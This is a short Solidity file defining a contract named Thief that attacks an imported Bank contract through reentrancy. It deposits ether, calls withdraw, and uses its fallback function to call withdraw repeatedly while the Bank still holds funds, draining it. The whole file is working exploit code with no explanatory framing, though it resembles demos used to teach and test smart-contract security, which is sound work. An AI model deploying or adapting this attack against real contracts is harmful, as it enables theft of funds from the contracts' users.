pragma solidity ^0.4.22;

import "./Bank.sol";

contract Thief {
    Bank public target;

    constructor(address _target) public {
        target = Bank(_target);
    }

    function collect() public payable {
        target.put.value(msg.value)();
        target.withdraw();
    }

    function() public payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}

